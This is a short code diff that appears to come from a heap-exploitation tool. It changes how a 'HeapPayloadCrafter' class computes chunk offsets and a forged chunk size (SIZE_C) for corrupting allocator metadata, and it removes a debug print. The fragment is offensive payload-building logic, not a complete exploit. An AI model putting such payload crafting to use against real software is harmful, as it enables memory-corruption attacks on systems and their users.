@@ -130,7 +130,7 @@ class HeapPayloadCrafter(object):
         else:
             # Find a contiguous chunk towards the end of `prev` that can be
             # used to place
-            i, unit_len = len(prev), self.size*3
+            i, unit_len = len(prev)-8, self.size*3
             i -= unit_len
             # Lets see if the payload size can be reduced, as we don't really need
             # forward consolidation.
@@ -140,10 +140,10 @@ class HeapPayloadCrafter(object):
                 prev[-self.size*2:] = list(after_c)
             else:
                 if (i % 2) != 0: i -= 1
-                values_list = [-1, -1, -4]
+                values_list = [-1, -1, -3]
                 SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, backward=False)
-                print ">>>>>>>>>>>>>>>>>>>>>", SIZE_C
-                SIZE_C = -(SIZE_C - 4)
+                SIZE_C = SIZE_C + 4
+                SIZE_C = -(len(prev) - SIZE_C)
             if self.no_back_consol:
                 SIZE_C |= 1
             else:
